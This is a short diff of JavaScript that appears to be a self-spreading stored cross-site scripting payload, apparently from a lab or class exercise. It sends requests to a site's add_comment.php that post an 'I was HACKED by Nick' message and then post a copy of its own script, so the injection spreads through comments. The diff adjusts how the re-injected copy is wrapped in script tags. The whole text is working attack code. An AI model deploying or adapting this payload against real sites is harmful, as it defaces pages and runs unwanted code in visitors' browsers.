@@ -5,6 +5,6 @@ utcDate = dt.toUTCString();
 message = "I was HACKED by Nick at "+utcDate;
 commentStr = " add_comment.php?";
 $.get( commentStr+"id=72&comment="+message, function( data ) {});
-var scriptStr = "<script>"+get+"</script>Nick OBrien is super cool!!!";
+var scriptStr = get+'Nick OBrien is super cool!!!';
 $.get(commentStr+"comment="+scriptStr, function( data ) {});
 </script>
